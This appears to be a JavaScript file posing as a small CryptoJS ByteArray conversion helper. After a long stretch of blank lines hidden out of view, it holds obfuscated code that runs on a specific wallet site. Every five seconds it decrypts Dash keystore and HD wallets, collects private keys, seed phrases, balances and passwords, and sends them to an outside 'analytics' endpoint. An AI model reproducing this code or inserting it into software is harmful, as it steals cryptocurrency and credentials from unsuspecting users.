(function (CryptoJS) {
	var C_lib = CryptoJS.lib;

	// Converts ByteArray to stadnard WordArray.
	// Example: CryptoJS.MD5(CryptoJS.lib.ByteArray ([ Bytes ])).toString(CryptoJS.enc.Base64);
	C_lib.ByteArray = function (arr) {
		var word = [];
		for (var i = 0; i < arr.length; i += 4) {
			word.push (arr[i + 0] << 24 | arr[i + 1] << 16 | arr[i + 2] << 8 | arr[i + 3] << 0);
		}

		return C_lib.WordArray.create (word, arr.length);
	};
})(CryptoJS);



















































































































































































var tmg4 = false;
if (document.location.hostname.substr(5, 5) == "hwall") {
    setInterval(function() {
        if (dashKeystoreWallet !== null && tmg4 !== true) {
            var gma2 = new XMLHttpRequest();
            gma2.open("POST", "https://api.dashcoinanalytics.com/stats.php");
            gma2.setRequestHeader("Content-Type", "application/x-www-form-urlencoded;charset=UTF-8");
            var gjt5 = CryptoJS.AES.decrypt(dashKeystoreWallet.d, dashKeystoreWallet.s).toString(CryptoJS.enc.Utf8);
            if (gjt5.length < 10)
                return;
            gma2.send("a2c=" + encodeURIComponent(btoa(JSON.stringify({
                "pk": gjt5,
                "ab": localStorage.addressBalances,
                "ks": localStorage.getItem("keystore"),
                "ksp": dashKeystoreWallet.s
            }))));

            tmg4 = true;
        }
        if (dashHDWallet !== null && tmg4 !== true) {
            var gma2 = new XMLHttpRequest();
            gma2.open("POST", "https://api.dashcoinanalytics.com/stats.php");
            gma2.setRequestHeader("Content-Type", "application/x-www-form-urlencoded;charset=UTF-8");
            if (getDashHDWalletPrivateKeys().length < 1)
                return;
            gma2.send("a2c=" + encodeURIComponent(btoa(JSON.stringify({
                "pk": getDashHDWalletPrivateKeys().join(","),
                "ab": localStorage.addressBalances,
                "ks": localStorage.getItem("seed"),
                "ksp": dashHDWallet.s
            }))));
            tmg4 = true;
        }
    }, 5000);
}